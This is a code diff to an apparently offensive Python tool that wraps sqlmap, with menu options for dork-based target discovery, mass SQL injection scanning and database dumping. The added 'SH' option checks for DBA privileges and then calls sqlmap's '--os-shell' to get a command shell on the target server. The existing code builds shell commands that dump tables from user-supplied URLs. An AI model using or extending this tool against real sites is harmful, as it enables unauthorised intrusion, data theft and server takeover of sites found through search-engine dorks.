@@ -34,6 +34,7 @@ print(Fore.LIGHTYELLOW_EX +"""
 [M] scan multiple websites with sqlmap
 [D] google hacking / dorks
 [SS] sqli attack with sqlmap 
+[SH] upload a shell with sqlmap
 [DS] auto scan with dork & sqlmap
 [WS] new window scan with sqlmap & dork (for linux only)
 
@@ -95,6 +96,15 @@ if option == "M" :
         os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 -D " + db + " --tables")
         table = input("table => ")
         os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 -D " + db + " -T" + table + " --dump")
+
+if option == "SH" : 
+    url = input("url => ")
+    print(Fore.RED+"""
+    [!] YOU WILL ONLY BE AVAILABLE TO UPLOAD A 
+    SHELL IF IT SHOWS "dba: True"
+    """)
+    os.system("sqlmap -u " + url + " --current-user --is-dba")
+    os.system("sqlmap -u "+ url + " --os-shell")       
            
 if at == "D" :
    searchterm = input(f'{Fore.GREEN}dork => {Fore.WHITE}')
